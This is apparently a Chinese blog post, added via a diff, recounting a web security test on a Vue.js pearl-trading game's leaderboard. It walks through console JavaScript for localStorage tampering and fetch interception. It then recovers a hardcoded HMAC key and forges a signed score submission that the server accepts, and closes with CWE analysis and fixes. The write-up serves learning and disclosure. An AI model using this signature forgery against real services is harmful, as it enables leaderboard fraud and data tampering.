+  html:not([color-scheme]) .md-chip,
+  [color-scheme="dark"] .md-chip {
+    background: #1e3a5f;
+    color: #60a5fa;
+  }
+
+  .md-chip-critical {
+    background: #ffebee;
+    color: #c62828;
+  }
+
+  html:not([color-scheme]) .md-chip-critical,
+  [color-scheme="dark"] .md-chip-critical {
+    background: #5c1a1a;
+    color: #ef5350;
+  }
+
+  .md-chip-high {
+    background: #fff3e0;
+    color: #ef6c00;
+  }
+
+  html:not([color-scheme]) .md-chip-high,
+  [color-scheme="dark"] .md-chip-high {
+    background: #5c3a00;
+    color: #ffa726;
+  }
+
+  /* 提示框 */
+  .md-alert {
+    padding: 16px;
+    border-radius: 8px;
+    border-left: 4px solid var(--md-primary);
+    background: #e8f0fe;
+    margin: 16px 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    color: var(--md-on-surface);
+  }
+
+  html:not([color-scheme]) .md-alert,
+  [color-scheme="dark"] .md-alert {
+    background: #1e3a5f;
+    color: #ffffff;
+    border-left-color: #0060ff;
+  }
+
+  .md-alert-warning {
+    border-left-color: var(--md-warning);
+    background: #fff3e0;
+  }
+
+  html:not([color-scheme]) .md-alert-warning,
+  [color-scheme="dark"] .md-alert-warning {
+    background: #7c2d12;
+    border-left-color: #fbbf24;
+  }
+
+  .md-alert-danger {
+    border-left-color: var(--md-error);
+    background: #ffebee;
+  }
+
+  html:not([color-scheme]) .md-alert-danger,
+  [color-scheme="dark"] .md-alert-danger {
+    background: #5c1a1a;
+    border-left-color: #ef5350;
+  }
+
+  .md-alert-success {
+    border-left-color: var(--md-success);
+    background: #e8f5e9;
+  }
+
+  html:not([color-scheme]) .md-alert-success,
+  [color-scheme="dark"] .md-alert-success {
+    background: #14532d;
+    border-left-color: #4ade80;
+  }
+
+  /* 步骤条 */
+  .md-stepper {
+    margin: 24px 0;
+  }
+
+  .md-step {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 24px;
+    position: relative;
+  }
+
+  .md-step:not(:last-child)::before {
+    content: '';
+    position: absolute;
+    left: 20px;
+    top: 40px;
+    bottom: -24px;
+    width: 2px;
+    background: #e0e0e0;
+  }
+
+  html:not([color-scheme]) .md-step:not(:last-child)::before,
+  [color-scheme="dark"] .md-step:not(:last-child)::before {
+    background: #424242;
+  }
+
+  .md-step-number {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: var(--md-primary);
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    flex-shrink: 0;
+    box-shadow: var(--md-elevation-1);
+  }
+
+  .md-step-content {
+    flex: 1;
+    padding-top: 8px;
+  }
+
+  .md-step-title {
+    font-size: 1.125rem;
+    font-weight: 600;
+    color: var(--md-on-surface);
+    margin-bottom: 8px;
+  }
+
+  .md-step-desc {
+    color: var(--md-on-surface-variant);
+    line-height: 1.6;
+  }
+
+  /* 代码块 - 防复制设计 */
+  .md-code-block {
+    background: #1e1e1e;
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 16px 0;
+    box-shadow: var(--md-elevation-1);
+    border: 1px solid #333;
+    position: relative;
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+  }
+
+  .md-code-block::after {
+    content: "仅供阅读";
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 11px;
+    color: #666;
+    background: rgba(0,0,0,0.5);
+    padding: 2px 8px;
+    border-radius: 4px;
+    pointer-events: none;
+  }
+
+  .md-code-header {
+    background: #2d2d2d;
+    padding: 12px 16px;
+    color: #cccccc;
+    font-size: 0.875rem;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    border-bottom: 1px solid #333;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    pointer-events: none;
+  }
+
+  .md-code-content {
+    padding: 16px;
+    overflow-x: auto;
+    color: #ffffff;
+    font-family: "JetBrains Mono", "Fira Code", "SF Mono", Monaco, "Cascadia Code", Consolas, monospace;
+    font-size: 0.875rem;
+    line-height: 1.6;
+    background: #1e1e1e;
+    pointer-events: none;
+  }
+
+  /* 模糊效果 - 用于敏感信息 */
+  .blur-text {
+    filter: blur(4px);
+    transition: filter 0.3s ease;
+    cursor: not-allowed;
+  }
+
+  .md-code-block:hover .blur-text {
+    filter: blur(2px);
+  }
+
+  /* 强制代码块内所有文字为白色 */
+  .md-code-content pre,
+  .md-code-content code,
+  .md-code-content span,
+  .md-code-content div,
+  .md-code-content p {
+    color: #ffffff !important;
+    background: transparent !important;
+    margin: 0;
+  }
+
+  /* 图片容器 */
+  .md-figure {
+    margin: 28px 0;
+    text-align: center;
+    background: var(--md-surface);
+    border-radius: 12px;
+    padding: 16px;
+    box-shadow: var(--md-elevation-1);
+  }
+
+  .md-figure img {
+    max-width: 100%;
+    border-radius: 8px;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+  }
+
+  .md-figure-caption {
+    color: var(--md-on-surface-variant);
+    font-size: 13px;
+    margin-top: 12px;
+    line-height: 1.6;
+  }
+
+  /* 表格 */
+  .md-table-wrap {
+    overflow-x: auto;
+    margin: 24px 0;
+    border-radius: 8px;
+    box-shadow: var(--md-elevation-1);
+  }
+
+  .md-table {
+    width: 100%;
+    border-collapse: separate;
+    border-spacing: 0;
+    font-size: 14px;
+    background: var(--md-surface);
+  }
+
+  .md-table th {
+    background: var(--md-surface-variant);
+    padding: 14px 16px;
+    text-align: left;
+    font-weight: 600;
+    color: var(--md-on-surface-variant);
+    border-bottom: 1px solid #e0e0e0;
+    font-size: 13px;
+  }
+
+  html:not([color-scheme]) .md-table th,
+  [color-scheme="dark"] .md-table th {
+    background: #252525;
+    border-bottom-color: #424242;
+  }
+
+  .md-table td {
+    padding: 14px 16px;
+    border-bottom: 1px solid #f0f0f0;
+    color: var(--md-on-surface);
+  }
+
+  html:not([color-scheme]) .md-table td,
+  [color-scheme="dark"] .md-table td {
+    border-bottom-color: #2a2a2a;
+    color: #b0b0b0;
+  }
+
+  .md-table tr:last-child td {
+    border-bottom: none;
+  }
+
+  .md-table tr:hover td {
+    background: var(--md-surface-variant);
+  }
+
+  /* 引用块 */
+  .md-blockquote {
+    margin: 24px 0;
+    padding: 20px 24px;
+    background: var(--md-surface-variant);
+    border-radius: 8px;
+    border-left: 4px solid var(--md-primary);
+    color: var(--md-on-surface-variant);
+    font-style: italic;
+    line-height: 1.8;
+  }
+
+  html:not([color-scheme]) .md-blockquote,
+  [color-scheme="dark"] .md-blockquote {
+    background: #252525;
+    color: #999;
+  }
+
+  /* 全背景强调色 - 用于关键目标文字 */
+  .md-highlight-full {
+    background: #0060ff;
+    color: #ffffff;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-weight: 500;
+  }
+
+  html:not([color-scheme]) .md-highlight-full,
+  [color-scheme="dark"] .md-highlight-full {
+    background: #0060ff;
+    color: #ffffff;
+  }
+
+  /* 分割线 */
+  .md-divider {
+    height: 1px;
+    background: #e0e0e0;
+    margin: 32px 0;
+  }
+
+  html:not([color-scheme]) .md-divider,
+  [color-scheme="dark"] .md-divider {
+    background: #424242;
+  }
+
+  /* 行内代码 - 去除底部背景色，改用边框或文字色 */
+  code {
+    font-family: "JetBrains Mono", "Fira Code", "SF Mono", Monaco, "Cascadia Code", Consolas, monospace;
+    color: #0060ff;
+    font-size: 0.9em;
+    background: transparent;
+    padding: 0;
+    font-weight: 500;
+  }
+
+  html:not([color-scheme]) code,
+  [color-scheme="dark"] code {
+    color: #60a5fa;
+    background: transparent;
+  }
+
+  h2 {
+    color: var(--md-on-surface);
+    font-weight: 600;
+    margin-top: 32px;
+    margin-bottom: 16px;
+    font-size: 1.75rem;
+  }
+
+  h3 {
+    color: var(--md-on-surface);
+    font-weight: 600;
+    margin-top: 24px;
+    margin-bottom: 12px;
+    font-size: 1.25rem;
+  }
+
+  p, li {
+    color: var(--md-on-surface);
+    line-height: 1.8;
+  }
+</style>
+
+<div class="md-card">
+  <div class="md-card-title">
+    <svg width="28" height="28" viewBox="0 0 24 24" fill="#0060ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    测试环境说明
+  </div>
+  <div style="line-height: 1.8;">
+    <p>最近看到Loxi发布了一个名为 <strong>SAR Pearl Market</strong>（贝壳珍珠市场）的一个基于 Vue.js 网页小游戏。这是一个模拟珍珠交易的经营类游戏，数据存储在浏览器本地，但有一个排行榜功能会将数据同步到服务器。</p>
+    <p style="margin-top: 12px;">这激起了我的神秘好胜心( ,我先试试能不能把榜首修改成我自己;所以我的目标是：<span class="md-highlight-full">绕过前端验证，篡改游戏数据，让自己登上排行榜榜首。</span></p>
+    <div style="margin-top: 16px;">
+      <span class="md-chip">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 6px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        安全研究
+      </span>
+      <span class="md-chip">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 6px;"><path d="M9 11.75c-.69 0-1.25.56-1.25 1.25s.56 1.25 1.25 1.25 1.25-.56 1.25-1.25-.56-1.25-1.25-1.25zm6 0c-.69 0-1.25.56-1.25 1.25s.56 1.25 1.25 1.25 1.25-.56 1.25-1.25-.56-1.25-1.25-1.25zM12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8 0-.29.02-.58.05-.86 2.36-1.05 4.23-2.98 5.21-5.37C11.07 8.33 14.05 10 17.42 10c.78 0 1.53-.09 2.25-.26.21.71.33 1.47.33 2.26 0 4.41-3.59 8-8 8z"/></svg>
+        前端逆向
+      </span>
+      <span class="md-chip">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 6px;"><path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z"/></svg>
+        CTF
+      </span>
+    </div>
+  </div>
+</div>
+
+<div class="md-alert">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#0060ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+  <div>
+    <strong>免责声明：</strong>我已将珍珠交易网站与提交服务修改成本地网络的一台靶机，所有操作均在局域网内进行。文章中的技术内容仅供安全研究和学习交流，请勿用于非法用途。本次测试没有对任何人造成影响,测试用靶机及网页源代码已于24小时内删除:本推文仅用于记录本次测试过程及我自己的收获
+  </div>
+</div>
+
+<h2 id="第一阶段：信息侦察"><a href="#第一阶段：信息侦察" class="headerlink" title="第一阶段：信息侦察"></a>第一阶段：信息侦察</h2><p>首先打开SAR Pearl Market游戏页面，按 <code>F12</code> 打开开发者工具，查看 Application（应用程序）标签下的 Local Storage。发现了 23 个以 <code>sar_</code> 开头的存储项：</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://s41.ax1x.com/2026/03/02/pepVPkF.png" alt="LocalStorage 键名列表">
+  <div class="md-figure-caption">图 1：扫描到的 localStorage 数据键名，包含余额、珍珠、银行金库等敏感信息</div>
+</div>
+
+<p>关键数据项包括：</p>
+<ul>
+  <li><code>sar_market_balance</code> - 主余额（现金）</li>
+  <li><code>sar_market_pearls</code> - 珍珠资产（核心货币）</li>
+  <li><code>sar_bank_vault</code> - 银行金库存款</li>
+  <li><code>sar_market_margin_debt</code> - 保证金债务</li>
+</ul>
+
+<p>在 Console 中执行查看命令：</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 查看当前资金数值
+  </div>
+  <div class="md-code-content"><pre>// 查看当前资金数值
+console.log('当前余额:', localStorage.getItem('sar_market_balance'));
+console.log('当前珍珠:', localStorage.getItem('sar_market_pearls'));
+console.log('银行存款:', localStorage.getItem('sar_bank_vault'));</pre></div>
+</div>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://s41.ax1x.com/2026/03/02/peSvOzD.png" alt="控制台输出当前余额1000">
+  <div class="md-figure-caption">图 2：控制台返回当前余额为 1000，珍珠数据为包含多种珍珠价格的复杂对象</div>
+</div>
+
+<p>发现余额是 <code>1000</code>，而珍珠数据是一个包含白、绿、蓝、紫、金、黑、红、彩虹珍珠价格的复杂数组。</p>
+
+<h2 id="第二阶段：前端篡改尝试"><a href="#第二阶段：前端篡改尝试" class="headerlink" title="第二阶段：前端篡改尝试"></a>第二阶段：前端篡改尝试</h2><div class="md-stepper">
+
+<div class="md-step">
+  <div class="md-step-number">1</div>
+  <div class="md-step-content">
+    <div class="md-step-title">直接修改 localStorage</div>
+    <div class="md-step-desc">
+      首先尝试直接修改 localStorage 中的数值。
+    </div>
+  </div>
+</div>
+
+</div>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 修改余额为 9999999
+  </div>
+  <div class="md-code-content"><pre>// 修改余额为 9999999
+localStorage.setItem('sar_market_balance', '9999999');
+localStorage.setItem('sar_market_pearls', '999999');
+localStorage.setItem('sar_bank_vault', '99999999');
+
+<p>&#x2F;&#x2F; 刷新页面<br>location.reload();</pre></div></p>
+</div>
+
+<div class="md-alert md-alert-warning">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#f57c00"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+  <div>
+    <strong>测试结果：</strong>刷新后数据被重置为 1000。说明游戏启动时会从某处加载初始数据覆盖 localStorage。
+  </div>
+</div>
+
+<div class="md-stepper">
+
+<div class="md-step">
+  <div class="md-step-number">2</div>
+  <div class="md-step-content">
+    <div class="md-step-title">修改 DOM 元素（视觉欺骗）</div>
+    <div class="md-step-desc">
+      通过 XPath 定位到余额显示元素，尝试修改页面显示。
+    </div>
+  </div>
+</div>
+
+</div>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 查找包含"余额"文本的元素
+  </div>
+  <div class="md-code-content"><pre>// 查找包含"余额"文本的元素
+const balanceLabel = document.evaluate("//*[contains(text(),'余额')]", document).iterateNext();
+const balanceValue = balanceLabel.nextElementSibling;
+console.log(balanceValue);</pre></div>
+</div>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://s41.ax1x.com/2026/03/02/peSvbi6.png" alt="定位到余额DOM元素">
+  <div class="md-figure-caption">图 3：成功定位到显示余额的 span 元素，class 为 "value animated_num"</div>
+</div>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 修改显示内容
+  </div>
+  <div class="md-code-content"><pre>balanceValue.textContent = '9,999,999';
+balanceValue.title = '9999999';</pre></div>
+</div>
+
+<p>页面上的数字确实变成了 9,999,999，但这只是<strong>视觉欺骗</strong>。点击旁边的"上报"按钮后，弹窗提示输入昵称，提交后页面强制刷新，数据恢复为 1000。</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://s41.ax1x.com/2026/03/02/peSvxLd.png" alt="上报按钮点击后的弹窗">
+  <div class="md-figure-caption">图 4：模拟点击上报按钮,弹出输入昵称的对话框，准备将数据提交到服务器</div>
+</div>
+
+<h2 id="第三阶段：网络层拦截"><a href="#第三阶段：网络层拦截" class="headerlink" title="第三阶段：网络层拦截"></a>第三阶段：网络层拦截</h2><p>前端修改无法持久化，说明服务器有验证。需要拦截网络请求，分析数据传输格式。</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 拦截 fetch 请求
+  </div>
+  <div class="md-code-content"><pre>// 拦截 fetch 请求
+const originalFetch = window.fetch;
+window.fetch = async function(url, options) {
+    if (url.includes('/api/submit')) {
+        console.log('请求地址:', url);
+        console.log('请求数据:', options.body);
+        debugger;  // 设置断点
+    }
+    return originalFetch(url, options);
+};</pre></div>
+</div>
+
+<p>再次点击上报按钮，成功在 Console 中看到捕获的请求：</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://s41.ax1x.com/2026/03/02/peSxQYV.png" alt="捕获到的请求数据">
+  <div class="md-figure-caption">图 5：拦截到提交到 /api/submit 的请求，发现包含 signature 签名字段</div>
+</div>
+
+<p>关键发现！请求体格式为：</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JSON - 请求体结构
+  </div>
+  <div class="md-code-content"><pre>{
+  "username": "Admin",
+  "score": 1000,
+  "timestamp": 17723777794682,
+  "signature": "394408b2d58e1aaa7cbc67755bca66bf5de42b1b46b4148eec14678ce8a30a79"
+}</pre></div>
+</div>
+
+<div class="md-alert md-alert-warning">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#f57c00"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+  <div>
+    <strong>关键发现：</strong>请求中包含 64 位十六进制的 <code>signature</code> 字段，说明有签名验证机制。直接修改 score 会被服务器拒绝。
+  </div>
+</div>
+
+<h2 id="第四阶段：逆向工程"><a href="#第四阶段：逆向工程" class="headerlink" title="第四阶段：逆向工程"></a>第四阶段：逆向工程</h2><p>需要找到签名算法，才能生成合法的签名。在 Debugger 暂停状态下，查看右侧的"调用栈"（Call Stack）面板。</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://your-image-bed.com/call-stack.png" alt="调用栈面板">
+  <div class="md-figure-caption">图 6：Chrome DevTools 的调用栈面板，显示从 window.fetch 到 Dt 函数的调用链</div>
+</div>
+
+<p>点击调用栈中的 <code>Dt</code> 函数，跳转到源码位置，发现了签名生成的核心逻辑：</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://your-image-bed.com/vt-function-found.png" alt="找到Vt函数">
+  <div class="md-figure-caption">图 7：在 Market-DTFD_XPB.js 中找到签名函数 Vt，发现硬编码密钥</div>
+</div>
+
+<p>完整的签名函数代码：</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 签名函数 Vt 源码
+  </div>
+  <div class="md-code-content"><pre>Vt = async (t, s, l) => {
+    const a = <span class="blur-text">"xK9#mP2$vL5@nQ8*wE4"</span>  // 硬编码密钥！
+    const i = `${t}:${s}:${l}`       // 格式：username:score:timestamp
+    const m = new TextEncoder()
+    const n = await crypto.subtle.importKey("raw", m.encode(a), {
+        name: "HMAC",
+        hash: "SHA-256"
+    }, !1, ["sign"])
+    const o = await crypto.subtle.sign("HMAC", n, m.encode(i))
+    return Array.from(new Uint8Array(o))
+        .map(r => r.toString(16).padStart(2, "0"))
+        .join("")
+}</pre></div>
+</div>
+
+<div class="md-alert md-alert-danger">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#d32f2f"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+  <div>
+    <strong>致命漏洞：</strong>签名密钥 <span class="blur-text">"xK9#mP2$vL5@nQ8*wE4"</span> 直接硬编码在前端代码中！这意味着任何人都可以使用相同的算法生成合法签名。
+  </div>
+</div>
+
+<h2 id="第五阶段：漏洞利用"><a href="#第五阶段：漏洞利用" class="headerlink" title="第五阶段：漏洞利用"></a>第五阶段：漏洞利用</h2><p>现在复现签名算法，构造恶意请求。在 Console 中重新定义 Vt 函数：</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 重新定义签名函数
+  </div>
+  <div class="md-code-content"><pre>// 重新定义签名函数
+const Vt = async (username, score, timestamp) => {
+    const secret = <span class="blur-text">"xK9#mP2$vL5@nQ8*wE4"</span>;
+    const message = `${username}:${score}:${timestamp}`;
+    const encoder = new TextEncoder();
+
+<pre><code>const key = await crypto.subtle.importKey(
+    &quot;raw&quot;, encoder.encode(secret),
+    {name: &quot;HMAC&quot;, hash: &quot;SHA-256&quot;},
+    false, [&quot;sign&quot;]
+);
+
+const signature = await crypto.subtle.sign(&quot;HMAC&quot;, key, encoder.encode(message));
+return Array.from(new Uint8Array(signature))
+    .map(b =&gt; b.toString(16).padStart(2, &quot;0&quot;))
+    .join(&quot;&quot;);
+</code></pre>
+<p>};</pre></div></p>
+</div>
+
+<p>生成新的签名并发送请求：</p>
+
+<div class="md-code-block">
+  <div class="md-code-header">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z"/></svg>
+    JavaScript - 生成伪造数据并发送
+  </div>
+  <div class="md-code-content"><pre>const username = "Admin";
+const score = 9999999;  // 目标分数
+const timestamp = Date.now();
+
+<p>Vt(username, score, timestamp).then(sig &#x3D;&gt; {<br>const fakeData &#x3D; {<br>username,<br>score,<br>timestamp,<br>signature: sig<br>};</p>
+<pre><code>console.log(&#39;伪造数据:&#39;, fakeData);
+
+// 发送到服务器
+return fetch(&quot;/api/submit&quot;, {
+    method: &quot;POST&quot;,
+    headers: {&quot;Content-Type&quot;: &quot;application/json&quot;},
+    body: JSON.stringify(fakeData)
+});
+</code></pre>
+<p>}).then(r &#x3D;&gt; r.json())<br>.then(result &#x3D;&gt; console.log(‘服务器响应:’, result));</pre></div></p>
+</div>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://your-image-bed.com/success-response.png" alt="服务器返回success true">
+  <div class="md-figure-caption">图 8：服务器返回 {success: true}，说明伪造的签名通过了验证</div>
+</div>
+
+<p>第一次尝试返回了 <code>{success: true}</code>！但查看排行榜发现没有变化。继续测试更大的数值，最终成功提交了 <code>99999999999</code>（11个9，约1000亿）。</p>
+
+<h2 id="攻击结果与验证"><a href="#攻击结果与验证" class="headerlink" title="攻击结果与验证"></a>攻击结果与验证</h2><p>打开 Leaderboard（排行榜）页面查看结果：</p>
+
+<div class="md-figure">
+  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://your-image-bed.com/leaderboard-rank1.png" alt="排行榜第一名">
+  <div class="md-figure-caption">图 9：排行榜显示 Admin 以 1000.00 亿登顶第一名，成功完成数据篡改</div>
+</div>
+
+<div class="md-alert md-alert-success">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="#388e3c"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+  <div>
+    <strong>攻击成功：</strong>Admin 从第 7 名（1000万）跃升至第 1 名（1000亿），数据已持久化至服务器。
+  </div>
+</div>
+
+<h2 id="漏洞分析与修复建议"><a href="#漏洞分析与修复建议" class="headerlink" title="漏洞分析与修复建议"></a>漏洞分析与修复建议</h2><h3 id="漏洞矩阵"><a href="#漏洞矩阵" class="headerlink" title="漏洞矩阵"></a>漏洞矩阵</h3><div class="md-table-wrap">
+  <table class="md-table">
+    <tr>
+      <th>漏洞ID</th>
+      <th>描述</th>
+      <th>严重程度</th>
+      <th>CVSS</th>
+    </tr>
+    <tr>
+      <td>CWE-798</td>
+      <td>硬编码密钥：签名密钥直接嵌入前端代码</td>
+      <td><span class="md-chip md-chip-critical">严重</span></td>
+      <td>9.8</td>
+    </tr>
+    <tr>
+      <td>CWE-602</td>
+      <td>客户端安全控制：签名计算在浏览器端完成</td>
+      <td><span class="md-chip md-chip-critical">严重</span></td>
+      <td>9.1</td>
+    </tr>
+    <tr>
+      <td>CWE-20</td>
+      <td>输入验证不足：未对 score 进行最大值限制</td>
+      <td><span class="md-chip md-chip-high">高</span></td>
+      <td>7.5</td>
+    </tr>
+  </table>
+</div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><div class="md-stepper">
+
+<div class="md-step">
+  <div class="md-step-number">1</div>
+  <div class="md-step-content">
+    <div class="md-step-title">移除前端签名</div>
+    <div class="md-step-desc">将 HMAC 计算迁移至服务器端 API，前端仅提交原始数据</div>
+  </div>
+</div>
+
+<div class="md-step">
+  <div class="md-step-number">2</div>
+  <div class="md-step-content">
+    <div class="md-step-title">密钥管理</div>
+    <div class="md-step-desc">使用环境变量存储密钥，禁止硬编码在任何客户端代码中</div>
+  </div>
+</div>
+
+<div class="md-step">
+  <div class="md-step-number">3</div>
+  <div class="md-step-content">
+    <div class="md-step-title">数据验证</div>
+    <div class="md-step-desc">服务器端校验 score 的合理性（如最大值、增长速率等）</div>
+  </div>
+</div>
+
+<div class="md-step">
+  <div class="md-step-number">4</div>
+  <div class="md-step-content">
+    <div class="md-step-title">防重放机制</div>
+    <div class="md-step-desc">添加 nonce 随机数或严格的时间窗口限制（5秒内）</div>
+  </div>
+</div>
+
+<div class="md-step">
+  <div class="md-step-number">5</div>
+  <div class="md-step-content">
+    <div class="md-step-title">频率限制</div>
+    <div class="md-step-desc">对 submit 接口实施 IP 限流和用户行为检测</div>
+  </div>
+</div>
+
+</div>
+
+<div class="md-blockquote">
+  <strong>核心原则：</strong>永远不要信任客户端数据，所有关键验证必须在服务器端完成。前端仅作为展示层，不参与任何安全决策。
+</div>
+
+<div class="md-divider"></div>
+
+<div style="text-align: center; color: var(--md-on-surface-variant); padding: 24px 0;">
+  <p>本文完。感谢阅读，欢迎交流讨论。</p>
